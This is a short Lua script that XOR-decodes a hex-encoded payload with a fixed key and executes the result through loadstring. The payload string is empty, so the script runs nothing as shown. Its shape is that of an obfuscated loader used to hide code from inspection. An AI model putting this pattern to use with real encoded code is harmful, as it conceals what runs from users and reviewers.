local KEY=73

local function decode(hex)
    local out={}
    for i=1,#hex,2 do
        local b=tonumber(hex:sub(i,i+1),16)
        out[#out+1]=string.char(bit32.bxor(b,KEY))
    end
    return table.concat(out)
end

local payload=""

local fn,err=loadstring(decode(payload))
if not fn then
    error(err)
end
fn()
